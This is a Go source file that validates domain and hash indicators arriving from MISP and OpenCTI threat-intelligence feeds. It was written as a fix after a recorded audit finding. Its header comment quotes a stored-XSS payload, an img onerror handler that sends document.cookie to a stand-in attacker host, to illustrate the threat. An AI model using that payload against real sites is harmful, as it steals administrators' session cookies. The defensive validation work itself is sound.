package feeds

import (
	"regexp"
	"strings"
)

// Indicator-shape validation at the feed-ingest boundary. Pre-fix the
// MISP and OpenCTI normalizers accepted any non-empty TrimSpace'd
// string for "domain" / "hostname" / hash indicator types — no shape
// check at all. Combined with the indicator flowing into TI Hit
// (Domain) / TI Hit (Hash) findings whose dst_ip / detail strings
// were rendered into innerHTML by parts of the SPA without escaping
// (NEW-26 / NEW-27), a malicious feed indicator like
//
//	<img src=x onerror=fetch('//attacker.test?'+document.cookie)>
//
// could land a stored XSS that fired in every admin browser when the
// notification panel or campaigns view rendered. The frontend escape
// fixes close the rendering side; this is the upstream control that
// prevents the malicious shape from reaching the matcher in the
// first place. Audit 2026-05-10 NEW-28.
//
// IP and CIDR indicators are already validated by net.ParseIP /
// net.ParseCIDR in the normalizers — those code paths don't need
// additional shape checks here.

// validDomainRE matches an RFC 1035-style domain name with two
// concessions to real-world DNS: leading underscore on labels (for
// SRV-style records like _dmarc.example.com) and an underscore-
// containing label-body. The TLD must be ≥ 2 alphabetic characters.
// Total length capped at 253 (DNS spec). This rejects anything
// containing < > " ' / # % & ; : ! @ * ? ( ) [ ] { } ` $ ^ ~ + = |
// \ — i.e. all the metacharacters that matter for HTML/JS injection.
var validDomainRE = regexp.MustCompile(`^([_a-zA-Z0-9]([_a-zA-Z0-9-]{0,61}[_a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$`)

// validDomain reports whether s is a syntactically plausible domain.
// The check is conservative — exotic-but-real edge cases (IDN puny-
// code, uppercase variations, trailing dots) are accepted. Anything
// with HTML metacharacters, control characters, or shape that doesn't
// fit DNS at all is refused.
func validDomain(s string) bool {
	if s == "" || len(s) > 253 {
		return false
	}
	// Strip a single trailing dot — DNS allows it, the regex doesn't,
	// and we don't want to reject a perfectly valid feed indicator
	// just because the upstream included the absolute form.
	s = strings.TrimSuffix(s, ".")
	return validDomainRE.MatchString(s)
}

// validHash reports whether s is a hex string of length 32 (MD5),
// 40 (SHA1), 64 (SHA256), or 128 (SHA512). The hash-type bucketing
// in the normalizers is type-only (the Indicator.Type stays
// "hash"), so any valid hex-of-fixed-length is accepted. Mixed case
// is fine — many feeds emit uppercase, some lowercase.
func validHash(s string) bool {
	switch len(s) {
	case 32, 40, 64, 128:
	default:
		return false
	}
	for i := 0; i < len(s); i++ {
		c := s[i]
		if !(('0' <= c && c <= '9') || ('a' <= c && c <= 'f') || ('A' <= c && c <= 'F')) {
			return false
		}
	}
	return true
}
